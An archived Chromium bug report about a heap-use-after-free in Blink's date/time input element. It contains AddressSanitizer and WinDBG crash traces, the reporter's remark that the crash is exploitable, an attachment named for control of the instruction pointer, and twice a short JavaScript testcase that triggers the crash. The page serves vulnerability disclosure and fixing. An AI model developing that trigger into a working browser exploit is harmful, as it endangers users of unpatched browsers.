# Heap-use-after-free in blink::DateTimeEditElement::~DateTimeEditElement

| Field | Value |
|-------|-------|
| **Issue ID** | [40081155](https://issues.chromium.org/issues/40081155) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | 0i...@gmail.com |
| **Assignee** | ke...@chromium.org |
| **Created** | 2015-01-11 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

**Please provide a brief explanation of the security issue.**

**VERSION**  

Chrome Version: Stable, Beta, asan-win32-release-311003  

Operating System: Windows 7 Enterprise (SP1)

**REPRODUCTION CASE**  

Open the attached 20107\_min.html file under ASAN build and follow the stack trace.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: Tab  

Crash State:  

==5416==ERROR: AddressSanitizer: heap-use-after-free on address 0x03f3a540 at pc 0x12ba9ea5 bp 0xdeadbeef sp 0x0020d5b0  

READ of size 4 at 0x03f3a540 thread T0  

#0 0x12ba9ea4 in blink::DateTimeEditElement::valueAsDateTimeFieldsState C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\shadow\DateTimeEditElement.cpp:810  

#1 0x12b79631 in blink::BaseMultipleFieldsDateAndTimeInputType::saveFormControlState C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\forms\BaseMultipleFieldsDateAndTimeInputType.cpp:486  

#2 0x126a9718 in blink::HTMLInputElement::saveFormControlState C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\HTMLInputElement.cpp:540  

#3 0x127b3770 in blink::DocumentState::toStateVector C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\forms\FormController.cpp:432  

#4 0x12ca4180 in blink::HistoryItem::documentState C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\loader\HistoryItem.cpp:158  

#5 0x12263a3d in blink::WebHistoryItem::documentState C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\web\WebHistoryItem.cpp:130  

#6 0x163b771b in content::SingleHistoryItemToPageState C:\b\build\slave\Win\_ASan\_Release\build\src\content\renderer\history\_serialization.cc:100  

#7 0x163b5b04 in content::HistoryEntryToPageState C:\b\build\slave\Win\_ASan\_Release\build\src\content\renderer\history\_serialization.cc:121  

#8 0x163b579d in content::HistoryEntryToPageState C:\b\build\slave\Win\_ASan\_Release\build\src\content\renderer\history\_serialization.cc:178  

#9 0x1622407e in content::RenderViewImpl::SendUpdateState C:\b\build\slave\Win\_ASan\_Release\build\src\content\renderer\render\_view\_impl.cc:1487  

#10 0x162318f7 in content::RenderViewImpl::SyncNavigationState C:\b\build\slave\Win\_ASan\_Release\build\src\content\renderer\render\_view\_impl.cc:2526  

#11 0x162640bd in base::internal::Invoker<1,base::internal::BindState<base::internal::RunnableAdapter<void (\_\_thiscall content::RenderViewImpl::\*)(void)>,void \_\_cdecl(content::RenderViewImpl \*),void \_\_cdecl(base::internal::UnretainedWrapper<content::RenderViewIm  

#12 0xfa3413e in base::Timer::RunScheduledTask C:\b\build\slave\Win\_ASan\_Release\build\src\base\callback.h:396  

#13 0xfa33e7c in base::BaseTimerTaskInternal::Run C:\b\build\slave\Win\_ASan\_Release\build\src\base\timer\timer.cc:49  

#14 0x190071f0 in base::internal::Invoker<1,base::internal::BindState<base::internal::RunnableAdapter<int (\_\_thiscall ppapi::proxy::FileIOResource::WriteOp::\*)(void)>,int \_\_cdecl(ppapi::proxy::FileIOResource::WriteOp \*),void \_\_cdecl(scoped\_refptr<ppapi::proxy::F  

#15 0xfa88d60 in base::debug::TaskAnnotator::RunTask C:\b\build\slave\Win\_ASan\_Release\build\src\base\callback.h:396  

#16 0xf9b8aae in base::MessageLoop::RunTask C:\b\build\slave\Win\_ASan\_Release\build\src\base\message\_loop\message\_loop.cc:436  

#17 0xf9ba59e in base::MessageLoop::DoDelayedWork C:\b\build\slave\Win\_ASan\_Release\build\src\base\message\_loop\message\_loop.cc:446  

#18 0xfa8a476 in base::MessagePumpDefault::Run C:\b\build\slave\Win\_ASan\_Release\build\src\base\message\_loop\message\_pump\_default.cc:36  

#19 0xf9b7946 in base::MessageLoop::RunHandler C:\b\build\slave\Win\_ASan\_Release\build\src\base\message\_loop\message\_loop.cc:405  

#20 0xfa8b235 in base::RunLoop::Run C:\b\build\slave\Win\_ASan\_Release\build\src\base\run\_loop.cc:55  

#21 0xf9b6de4 in base::MessageLoop::Run C:\b\build\slave\Win\_ASan\_Release\build\src\base\message\_loop\message\_loop.cc:298  

#22 0x162af210 in content::RendererMain C:\b\build\slave\Win\_ASan\_Release\build\src\content\renderer\renderer\_main.cc:235  

#23 0xf9771cb in content::RunNamedProcessTypeMain C:\b\build\slave\Win\_ASan\_Release\build\src\content\app\content\_main\_runner.cc:423  

#24 0xf97aebe in content::ContentMainRunnerImpl::Run C:\b\build\slave\Win\_ASan\_Release\build\src\content\app\content\_main\_runner.cc:800  

#25 0xf976b0b in content::ContentMain C:\b\build\slave\Win\_ASan\_Release\build\src\content\app\content\_main.cc:19  

#26 0xf5b1151 in ChromeMain C:\b\build\slave\Win\_ASan\_Release\build\src\chrome\app\chrome\_main.cc:66  

#27 0x1259208 in MainDllLoader::Launch C:\b\build\slave\Win\_ASan\_Release\build\src\chrome\app\client\_util.cc:226  

#28 0x1251765 in main C:\b\build\slave\Win\_ASan\_Release\build\src\chrome\app\chrome\_exe\_main\_win.cc:157  

#29 0x1464b98 in \_\_tmainCRTStartup f:\dd\vctools\crt\crtw32\startup\crt0.c:255  

#30 0x75543389 in BaseThreadInitThunk+0x11 (C:\Windows\syswow64\kernel32.dll+0x13389)  

#31 0x776e9f71 in RtlInitializeExceptionChain+0x62 (C:\Windows\SysWOW64\ntdll.dll+0x39f71)  

#32 0x776e9f44 in RtlInitializeExceptionChain+0x35 (C:\Windows\SysWOW64\ntdll.dll+0x39f44)

0x03f3a540 is located 0 bytes inside of 120-byte region [0x03f3a540,0x03f3a5b8)  

freed by thread T0 here:  

#0 0x14553f2 in free c:\b\build\slave\win\_asan\_release\build\src\third\_party\llvm\projects\compiler-rt\lib\asan\asan\_malloc\_win.cc:42  

#1 0x12bc7c60 in blink::DateTimeYearFieldElement::`scalar deleting destructor' C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\shadow\DateTimeFieldElements.h:50  

#2 0x1240f282 in blink::Node::removedLastRef C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\dom\Node.cpp:2262  

#3 0x124d7571 in blink::Range::processAncestorsAndTheirSiblings C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\dom\TreeShared.h:82  

#4 0x124ccafd in blink::Range::processContents C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\dom\Range.cpp:639  

#5 0x124cba17 in blink::Range::deleteContents C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\dom\Range.cpp:469  

#6 0x130392c0 in blink::DOMSelection::deleteFromDocument C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\editing\DOMSelection.cpp:454  

#7 0x144466e1 in blink::V8DOMConfiguration::installMethod[v8::ObjectTemplate,blink::V8DOMConfiguration::MethodConfiguration](javascript:void(0);) C:\b\build\slave\Win\_ASan\_Release\build\src\out\Release\gen\blink\bindings\core\v8\V8Selection.cpp:338  

#8 0x118f453c in v8::internal::FunctionCallbackArguments::Call C:\b\build\slave\Win\_ASan\_Release\build\src\v8\src\arguments.cc:33  

#9 0x1148a051 in v8::internal::Builtins::Builtins C:\b\build\slave\Win\_ASan\_Release\build\src\v8\src\builtins.cc:1139

previously allocated by thread T0 here:  

#0 0x1455496 in malloc c:\b\build\slave\win\_asan\_release\build\src\third\_party\llvm\projects\compiler-rt\lib\asan\asan\_malloc\_win.cc:58  

#1 0x13c1f7ce in blink::RenderObject::operator new C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\wtf\PartitionAlloc.h:477  

#2 0x12bc50be in blink::DateTimeMonthFieldElement::create C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\shadow\DateTimeFieldElements.cpp:414  

#3 0x12b9cbf5 in blink::DateTimeEditBuilder::visitField C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\shadow\DateTimeEditElement.cpp:235  

#4 0x198d5531 in blink::DateTimeFormat::parse C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\platform\text\DateTimeFormat.cpp:198  

#5 0x12ba7565 in blink::DateTimeEditElement::layout C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\shadow\DateTimeEditElement.cpp:132  

#6 0x12ba948e in blink::DateTimeEditElement::setEmptyValue C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\shadow\DateTimeEditElement.cpp:754  

#7 0x12b7858d in blink::BaseMultipleFieldsDateAndTimeInputType::updateView C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\forms\BaseMultipleFieldsDateAndTimeInputType.cpp:536  

#8 0x126a7764 in blink::HTMLInputElement::updateType C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\HTMLInputElement.cpp:495  

#9 0x126af42b in blink::HTMLInputElement::parseAttribute C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\HTMLInputElement.cpp:700  

#10 0x124516a4 in blink::Element::attributeChanged C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\dom\Element.cpp:1083  

#11 0x12467d20 in blink::Element::didAddAttribute C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\dom\Element.cpp:2948  

#12 0x124674c0 in blink::Element::appendAttributeInternal C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\dom\Element.cpp:2087  

#13 0x12442e75 in blink::Element::setAttribute C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\dom\Element.cpp:1044  

#14 0x126a5441 in blink::HTMLSourceElement::setType C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\HTMLInputElement.cpp:408  

#15 0x14f84af1 in blink::DOMDataStore::setReference C:\b\build\slave\Win\_ASan\_Release\build\src\out\Release\gen\blink\bindings\core\v8\V8HTMLInputElement.cpp:1039  

#16 0x118f8bc2 in v8::internal::PropertyCallbackArguments::Call C:\b\build\slave\Win\_ASan\_Release\build\src\v8\src\arguments.cc:89  

#17 0x1103da31 in v8::internal::Object::SetPropertyWithAccessor C:\b\build\slave\Win\_ASan\_Release\build\src\v8\src\objects.cc:352  

#18 0x11084f38 in v8::internal::Object::SetProperty C:\b\build\slave\Win\_ASan\_Release\build\src\v8\src\objects.cc:2846  

#19 0x1186fcd5 in v8::internal::StoreIC::Store C:\b\build\slave\Win\_ASan\_Release\build\src\v8\src\ic\ic.cc:1573  

#20 0x11881257 in v8::internal::StoreIC\_Miss C:\b\build\slave\Win\_ASan\_Release\build\src\v8\src\ic\ic.cc:2373

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\build\slave\Win\_ASan\_Release\build\src\third\_party\WebKit\Source\core\html\shadow\DateTimeEditElement.cpp:810 blink::DateTimeEditElement::valueAsDateTimeFieldsState

Under WinDBG with symbols:  

chrome\_child!blink::DateTimeEditElement::valueAsDateTimeFieldsState+0x62:  

628c669e ff9044020000 call dword ptr [eax+244h] ds:002b:f000087f=????????

As we can see above, it's exploitable crash.  

I will investigate this crash deeper.

## Attachments

- [20107_min.html](attachments/20107_min.html) (text/html, 694 B)
- [test.html](attachments/test.html) (text/html, 1018 B)
- [test.html](attachments/test_53287376.html) (text/html, 1.4 KB)
- [step_DateTimeEditElementlayout_UAF_WRITE.html](attachments/step_DateTimeEditElementlayout_UAF_WRITE.html) (text/html, 1.4 KB)
- [readonly_TimerBaseStop_nullptr.html](attachments/readonly_TimerBaseStop_nullptr.html) (text/html, 1.4 KB)
- [disabled_TimerBaseStop_nullptr.html](attachments/disabled_TimerBaseStop_nullptr.html) (text/html, 1.4 KB)
- [double_free_write_violation.html](attachments/double_free_write_violation.html) (text/html, 1.4 KB)
- [EIP_PWNED.html](attachments/EIP_PWNED.html) (text/html, 1.6 KB)

## Timeline

### cl...@chromium.org (2015-01-11)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=4811497728376832

### in...@chromium.org (2015-01-11)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-11)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=4811497728376832

Uploader: aarya@google.com
Job Type: Windows_asan_chrome

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x0371cb80
Crash State:
  blink::DateTimeEditElement::valueAsDateTimeFieldsState
  blink::BaseMultipleFieldsDateAndTimeInputType::saveFormControlState
  blink::HTMLInputElement::saveFormControlState
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=windows_asan_chrome&range=311003:311005

Minimized Testcase (0.51 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95kfz0iOrb9ZiSMBPOrnBJrtqck32_7upSWI-fTciMGnNzrlj9uL5OQPO_z_nRBWA44hxuINjcouW48EaCwOrpWawIwPY6m5Mp0iwmuMaQPU9jsPUX7oFp-0b9laGcMl4-icT0KKz02tg7F9jg4Mm3kFsqgDA
<button id="GBNDNFLA"><script>


try{GBNDNFLA=document.getElementById("GBNDNFLA");}catch(e){}

var CNJJLDHD=document.createElement('input');
CNJJLDHD.setAttribute("id","CNJJLDHD");

try {GBNDNFLA.appendChild(CNJJLDHD);}catch(e){}
try{CNJJLDHD=document.getElementById("CNJJLDHD");}catch(e){}




try {CNJJLDHD.setSelectionRange(1);}catch(e){}


try{CNJJLDHD.type='date';}catch(e){}


try{var oSelection=window.getSelection();

document.execCommand("SelectAll", false);

oSelection.deleteFromDocument();}catch(e){}

</script>





### cl...@chromium.org (2015-01-11)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5673622319398912

### 0i...@gmail.com (2015-01-11)

I have modified the repro (in attachment) and I've removed window.location.reload on onload. I've added a reference to CNJJLDHD.value with result in below stack trace (on stable):
eax=78002655 ebx=00000000 ecx=552600f0 edx=0043e648 esi=00000001 edi=55254070
eip=628c5a16 esp=0043e640 ebp=0043e650 iopl=0         nv up ei ng nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293
chrome_child!blink::DateTimeEditElement::anyEditableFieldsHaveValues+0x6e:
628c5a16 8b803c020000    mov     eax,dword ptr [eax+23Ch] ds:002b:78002891=????????
0:000> k
ChildEBP RetAddr  
0043e650 628c2e03 chrome_child!blink::DateTimeEditElement::anyEditableFieldsHaveValues+0x6e [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\shadow\datetimeeditelement.cpp @ 484]
0043e668 6209773a chrome_child!blink::BaseMultipleFieldsDateAndTimeInputType::hasBadInput+0x7d [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\forms\basemultiplefieldsdateandtimeinputtype.cpp @ 449]
0043e670 62096e26 chrome_child!blink::HTMLInputElement::hasBadInput+0x22 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp @ 234]
0043e678 62096cfe chrome_child!blink::FormAssociatedElement::valid+0x65 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\formassociatedelement.cpp @ 250]
0043e688 623f0a27 chrome_child!blink::HTMLFormControlElement::setNeedsValidityCheck+0xd [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlformcontrolelement.cpp @ 494]
0043e694 628c3017 chrome_child!blink::HTMLInputElement::setValueInternal+0x33 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp @ 1028]
(Inline) -------- chrome_child!blink::InputType::setValue+0xc [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\forms\inputtype.cpp @ 547]
0043e6b0 623f0952 chrome_child!blink::BaseMultipleFieldsDateAndTimeInputType::setValue+0x14 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\forms\basemultiplefieldsdateandtimeinputtype.cpp @ 495]
0043e6dc 623f0845 chrome_child!blink::HTMLInputElement::setValue+0x106 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp @ 1015]
0043e6f4 626ff72f chrome_child!blink::HTMLInputElement::setValue+0x7c [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp @ 995]
0043e74c 626ff80b chrome_child!blink::HTMLInputElementV8Internal::valueAttributeSetter+0xff [c:\b\build\slave\win\build\src\out\release\gen\blink\bindings\core\v8\v8htmlinputelement.cpp @ 1103]
0043e764 61f56246 chrome_child!blink::HTMLInputElementV8Internal::valueAttributeSetterCallback+0x2e [c:\b\build\slave\win\build\src\out\release\gen\blink\bindings\core\v8\v8htmlinputelement.cpp @ 1112]
0043e794 61f55ce3 chrome_child!v8::internal::PropertyCallbackArguments::Call+0x71 [c:\b\build\slave\win\build\src\v8\src\arguments.cc @ 89]
0043e7fc 61ed6b46 chrome_child!v8::internal::Object::SetPropertyWithAccessor+0x124 [c:\b\build\slave\win\build\src\v8\src\objects.cc @ 507]
0043e854 61ed667c chrome_child!v8::internal::Object::SetProperty+0x24a [c:\b\build\slave\win\build\src\v8\src\objects.cc @ 2872]
0043e90c 61ed639c chrome_child!v8::internal::StoreIC::Store+0x225 [c:\b\build\slave\win\build\src\v8\src\ic\ic.cc @ 1333]
(Inline) -------- chrome_child!v8::internal::__RT_impl_StoreIC_Miss+0x7b [c:\b\build\slave\win\build\src\v8\src\ic\ic.cc @ 2089]
0043ea14 61e56ed1 chrome_child!v8::internal::StoreIC_Miss+0x85 [c:\b\build\slave\win\build\src\v8\src\ic\ic.cc @ 2079]
0043ea60 61e56d30 chrome_child!v8::internal::Invoke+0x12f [c:\b\build\slave\win\build\src\v8\src\execution.cc @ 92]
0043ea9c 61f169ca chrome_child!v8::internal::Execution::Call+0x137 [c:\b\build\slave\win\build\src\v8\src\execution.cc @ 141]
0043eae4 61f22ce5 chrome_child!v8::Script::Run+0x129 [c:\b\build\slave\win\build\src\v8\src\api.cc @ 1690]
0043eb28 61f1e5ca chrome_child!blink::V8ScriptRunner::runCompiledScript+0x16e [c:\b\build\slave\win\build\src\third_party\webkit\source\bindings\core\v8\v8scriptrunner.cpp @ 179]
0043ebac 61ec8b28 chrome_child!blink::ScriptController::executeScriptAndReturnValue+0x2b0 [c:\b\build\slave\win\build\src\third_party\webkit\source\bindings\core\v8\scriptcontroller.cpp @ 196]
0043ec14 61ec8716 chrome_child!blink::ScriptController::evaluateScriptInMainWorld+0x24b [c:\b\build\slave\win\build\src\third_party\webkit\source\bindings\core\v8\scriptcontroller.cpp @ 611]
0043ec44 61f39649 chrome_child!blink::ScriptController::executeScriptInMainWorld+0x2a [c:\b\build\slave\win\build\src\third_party\webkit\source\bindings\core\v8\scriptcontroller.cpp @ 579]
0043ecb0 61ef6cbb chrome_child!blink::ScriptLoader::executeScript+0x2f6 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\dom\scriptloader.cpp @ 354]
0043edf0 61ef5285 chrome_child!blink::ScriptLoader::prepareScript+0x3b9 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\dom\scriptloader.cpp @ 247]
0043ef18 61ef4ed3 chrome_child!blink::HTMLScriptRunner::runScript+0x8d [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmlscriptrunner.cpp @ 322]
0043ef30 61ef4dca chrome_child!blink::HTMLScriptRunner::execute+0x20 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmlscriptrunner.cpp @ 184]
0043ef50 61ee05fa chrome_child!blink::HTMLDocumentParser::runScriptsForPausedTreeBuilder+0x62 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmldocumentparser.cpp @ 304]
0043efb4 61ee013c chrome_child!blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser+0x249 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmldocumentparser.cpp @ 486]
0043f030 61edf913 chrome_child!blink::HTMLDocumentParser::pumpPendingSpeculations+0x222 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmldocumentparser.cpp @ 536]
0043f058 61edf7f5 chrome_child!blink::HTMLDocumentParser::didReceiveParsedChunkFromBackgroundParser+0xe1 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmldocumentparser.cpp @ 366]
0043f068 61edf7c2 chrome_child!WTF::FunctionWrapper<void (__thiscall blink::HTMLDocumentParser::*)(WTF::PassOwnPtr<blink::HTMLDocumentParser::ParsedChunk>)>::operator()+0x32 [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 229]
0043f074 61ede42d chrome_child!WTF::BoundFunctionImpl<WTF::FunctionWrapper<void (__thiscall blink::HTMLDocumentParser::*)(WTF::PassOwnPtr<blink::HTMLDocumentParser::ParsedChunk>)>,void __cdecl(WTF::WeakPtr<blink::HTMLDocumentParser>,WTF::PassOwnPtr<blink::HTMLDocumentParser::ParsedChunk>)>::operator()+0x1b [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 921]
(Inline) -------- chrome_child!WTF::Function<void __cdecl(void)>::operator()+0xa [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 1077]
0043f080 61ede3c5 chrome_child!WTF::callFunctionObject+0xe [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\mainthread.cpp @ 66]
(Inline) -------- chrome_child!WTF::FunctionWrapper<void (__cdecl*)(blink::FELighting::PlatformApplyGenericParameters *)>::operator()+0xfe82cfb6 [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 78]
0043f088 61ede35a chrome_child!WTF::BoundFunctionImpl<WTF::FunctionWrapper<void (__cdecl*)(blink::FELighting::PlatformApplyGenericParameters *)>,void __cdecl(blink::FELighting::PlatformApplyGenericParameters *)>::operator()+0x6
(Inline) -------- chrome_child!WTF::Function<void __cdecl(void)>::operator()+0x8 [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 1077]
0043f0bc 61d3a6c2 chrome_child!blink::TracedTask::run+0xb8 [c:\b\build\slave\win\build\src\third_party\webkit\source\platform\scheduler\tracedtask.cpp @ 21]
(Inline) -------- chrome_child!base::Callback<void __cdecl(void)>::Run+0xb [c:\b\build\slave\win\build\src\base\callback.h @ 401]
0043f164 61d3a169 chrome_child!base::debug::TaskAnnotator::RunTask+0x32c [c:\b\build\slave\win\build\src\base\debug\task_annotator.cc @ 62]
0043f19c 61d39ff4 chrome_child!base::MessageLoop::RunTask+0xe4 [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 449]
(Inline) -------- chrome_child!base::MessageLoop::DeferOrRunPendingTask+0x115 [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 456]
0043f2e0 61d3c29f chrome_child!base::MessageLoop::DoWork+0x375 [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 566]
0043f304 61d3809c chrome_child!base::MessagePumpDefault::Run+0xc8 [c:\b\build\slave\win\build\src\base\message_loop\message_pump_default.cc @ 33]
(Inline) -------- chrome_child!base::internal::PlatformThreadLocalStorage::GetTLSValue+0x7 [c:\b\build\slave\win\build\src\base\threading\thread_local_storage_win.cc @ 30]
(Inline) -------- chrome_child!base::ThreadLocalStorage::StaticSlot::Get+0xc [c:\b\build\slave\win\build\src\base\threading\thread_local_storage.cc @ 231]
0043f320 61d39b3b chrome_child!tracked_objects::ThreadData::Get+0x28 [c:\b\build\slave\win\build\src\base\tracked_objects.cc @ 334]
0043f330 61d39a69 chrome_child!tracked_objects::TaskStopwatch::TaskStopwatch+0x3f [c:\b\build\slave\win\build\src\base\tracked_objects.cc @ 860]
0043f358 61d3a25c chrome_child!base::RunLoop::Run+0x2d [c:\b\build\slave\win\build\src\base\run_loop.cc @ 55]
0043f37c 61da47ae chrome_child!base::MessageLoop::Run+0x46 [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 309]
0043f604 61d32551 chrome_child!content::RendererMain+0x292 [c:\b\build\slave\win\build\src\content\renderer\renderer_main.cc @ 231]
0043f618 61d324cd chrome_child!content::RunNamedProcessTypeMain+0x61 [c:\b\build\slave\win\build\src\content\app\content_main_runner.cc @ 420]
0043f678 61d1d251 chrome_child!content::ContentMainRunnerImpl::Run+0x66 [c:\b\build\slave\win\build\src\content\app\content_main_runner.cc @ 769]
0043f688 61d1c2b5 chrome_child!content::ContentMain+0x23 [c:\b\build\slave\win\build\src\content\app\content_main.cc @ 19]
0043f6d0 00257573 chrome_child!ChromeMain+0x61 [c:\b\build\slave\win\build\src\chrome\app\chrome_main.cc @ 60]
0043f760 00256f76 chrome!MainDllLoader::Launch+0x15f [c:\b\build\slave\win\build\src\chrome\app\client_util.cc @ 316]
0043f7a4 002793ca chrome!wWinMain+0x5a [c:\b\build\slave\win\build\src\chrome\app\chrome_exe_main_win.cc @ 115]
0043f7f0 7554338a chrome!__tmainCRTStartup+0xfd [f:\dd\vctools\crt\crtw32\startup\crt0.c @ 251]
0043f7fc 776e9f72 kernel32!BaseThreadInitThunk+0xe
0043f83c 776e9f45 ntdll!__RtlUserThreadStart+0x70
0043f854 00000000 ntdll!_RtlUserThreadStart+0x1b

### cl...@chromium.org (2015-01-11)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-11)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5673622319398912

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000087300
Crash State:
  blink::DateTimeEditElement::valueAsDateTimeFieldsState
  blink::BaseMultipleFieldsDateAndTimeInputType::saveFormControlState
  blink::HTMLInputElement::saveFormControlState
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=268656:269696

Minimized Testcase (0.51 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97YfpFxD63iayM9fS-bTRlTOHRK8s-I11_tdVkDk5c0lhdUvxmOhreSIsJTcBT3DbSnF1wwrZ2HmDG8vAbFWgtjnJLEd8iWYNtE5-6yWu72HSzDfDON6kbGzbfdqIDiXSI-ciDpwAtTxBzZIfvuRc_mXVXv1w
<button id="GBNDNFLA"><script>


try{GBNDNFLA=document.getElementById("GBNDNFLA");}catch(e){}

var CNJJLDHD=document.createElement('input');
CNJJLDHD.setAttribute("id","CNJJLDHD");

try {GBNDNFLA.appendChild(CNJJLDHD);}catch(e){}
try{CNJJLDHD=document.getElementById("CNJJLDHD");}catch(e){}




try {CNJJLDHD.setSelectionRange(1);}catch(e){}


try{CNJJLDHD.type='date';}catch(e){}


try{var oSelection=window.getSelection();

document.execCommand("SelectAll", false);

oSelection.deleteFromDocument();}catch(e){}

</script>





### in...@chromium.org (2015-01-11)

[Empty comment from Monorail migration]

### 0i...@gmail.com (2015-01-12)

In each testcase, crash happens when DateTimeFieldsState::m_fields[fieldIndex] is referenced, so it looks like it's freed *somewhere* earlier.

### 0i...@gmail.com (2015-01-12)

Ok, now I did it partly:)
My analys shows that chrome crashes also when CNJJLDHD.type = "date","week","time" or "search", in case of "search" crash is different and results with a NULL Pointer from innerHTML <- should I report it as another issue?


I've attached repro, where stable calls some freed heap address.
Call stack form windbg and stable chrome below:
0025e9f8 62ee5a1e 0xe0c158
0025ea10 62ee2e03 chrome_child!blink::DateTimeEditElement::anyEditableFieldsHaveValues+0x76 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\shadow\datetimeeditelement.cpp @ 484]
0025ea28 626b773a chrome_child!blink::BaseMultipleFieldsDateAndTimeInputType::hasBadInput+0x7d [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\forms\basemultiplefieldsdateandtimeinputtype.cpp @ 449]
0025ea30 626b6e26 chrome_child!blink::HTMLInputElement::hasBadInput+0x22 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp @ 234]
0025ea38 626b6cfe chrome_child!blink::FormAssociatedElement::valid+0x65 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\formassociatedelement.cpp @ 250]
0025ea48 62a10a27 chrome_child!blink::HTMLFormControlElement::setNeedsValidityCheck+0xd [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlformcontrolelement.cpp @ 494]
0025ea54 62ee3017 chrome_child!blink::HTMLInputElement::setValueInternal+0x33 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp @ 1028]
(Inline) -------- chrome_child!blink::InputType::setValue+0xc [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\forms\inputtype.cpp @ 547]
0025ea70 62a10952 chrome_child!blink::BaseMultipleFieldsDateAndTimeInputType::setValue+0x14 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\forms\basemultiplefieldsdateandtimeinputtype.cpp @ 495]
0025ea9c 62a10845 chrome_child!blink::HTMLInputElement::setValue+0x106 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp @ 1015]
0025eab4 62d1f72f chrome_child!blink::HTMLInputElement::setValue+0x7c [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp @ 995]
